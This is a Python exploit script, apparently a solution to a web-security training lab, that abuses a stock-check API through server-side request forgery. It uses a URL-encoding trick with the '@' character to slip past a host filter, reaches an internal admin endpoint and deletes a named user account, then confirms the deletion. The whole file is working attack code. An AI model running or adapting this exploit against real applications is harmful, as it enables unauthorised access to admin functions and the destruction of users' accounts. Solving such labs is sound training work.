import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def delete_user(url, username):
    stock_check_path = "/product/stock"
    delete_user_path = f"http://localhost%23@stock.weliketoshop.net/admin/delete?username={username}"
    params = {'stockApi': delete_user_path}
    response1 = requests.post(url + stock_check_path, data=params, verify=False)
    print(response1.status_code)

    # Validate if User was successfully deleted
    print(f"Verifying, if {username}'s account was successfully deleted.")
    admin_page_path = "http://localhost%2523@stock.weliketoshop.net/admin"
    params2 = {'stockApi': admin_page_path}
    response2 = requests.post(url + stock_check_path, data=params2, verify=False)
    print(response2.status_code)
    if "carlos" not in response2.text:
        print(f"{username}'s account was successfully deleted.")
    else:
        print(f"{username}'s account deletion failed, please try again.")


def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <username>")
        print("Example: python script.py http://127.0.0.1:8080 carlos")
        sys.exit(-1)
    else:
        url = sys.argv[1]
        username = sys.argv[2]
        print("Deleting User's account.......")
        delete_user(url, username)


if __name__ == "__main__":
    main()
    sys.exit(0)
